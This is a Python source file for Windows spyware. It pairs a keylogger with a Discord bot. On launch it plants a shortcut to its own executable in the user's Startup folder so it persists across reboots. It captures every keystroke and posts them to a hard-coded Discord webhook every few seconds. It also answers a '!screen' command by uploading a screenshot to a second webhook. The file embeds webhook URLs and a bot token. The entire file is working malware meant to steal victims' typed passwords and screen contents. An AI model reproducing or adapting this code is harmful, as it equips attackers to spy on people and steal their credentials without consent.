import keyboard
import time
import threading
import subprocess
import os
import sys
import winshell
from win32com.client import Dispatch
import discord
from discord.ext import commands
import pyautogui
import requests
import io
import webbrowser

time.sleep(5)

# Chemin de l'exe en cours d'ex√©cution
exe_path = sys.executable  # √ßa renvoie le chemin complet du .exe actuel

# Dossier Startup de l'utilisateur
startup = winshell.startup()

# Raccourci √† cr√©er f
shortcut_path = os.path.join(startup, "Xeno.lnk")

# Cr√©ation du raccourci
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.Targetpath = exe_path
shortcut.WorkingDirectory = os.path.dirname(exe_path)
shortcut.save()


# Replace 'WEBHOOK_URL' with your actual Discord webhook URLF
WEBHOOK_URL = 'https://discord.com/api/webhooks/1459960463440740562/l7pwB8kDOwVufIZhDlpHwvZQQ9LIspAJt4-d7gnXVDgZBBJjjFer3GNIXDcs9eBRvff5'
WEBHOOKSCREEN = "https://discord.com/api/webhooks/1460356029475979398/rtV-CW91FXEcMtFQOl4qJ7sNWIQv01iePma6jplcC7POABAqminaOctYK4oNqtaqjYe3"
TOKEN = "MTQ2MDMzNTk1NDA0MzYwMDk5Nw.GHlIVG.Zfq1cd8_-kEjL3L7pFj8JD-hTCHkiZ3y7F7HBU"


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot connect√© : {bot.user}")

@bot.command()
async def screen(ctx):
    # Capture √©cran
    img = pyautogui.screenshot()

    # Image en m√©moire (pas de fichier visible)
    buffer = io.BytesIO()
    img.save(buffer, format="PNG")
    buffer.seek(0)

    # Envoi au webhook
    requests.post(
        WEBHOOKSCREEN,
        files={"file": ("screenshot.png", buffer, "image/png")}
    )

    await ctx.send("üì∏ Screenshot sent to webhook")
    

# Create a list to store the captured keystrokes
keylogs = []

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global keylogs

    # Check if there are any keylogs to send
    if keylogs:
        # Convert the keylogs to a string
        keylogs_str = '\n'.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        # Send the payload to the Discord webhook
        requests.post(WEBHOOK_URL, data=payload)

        # Clear the keylogs list
        keylogs = []

    # Schedule the next execution of the function after 10 seconds
    threading.Timer(5, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)

# Start capturing keystrokes
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

bot.run(TOKEN)
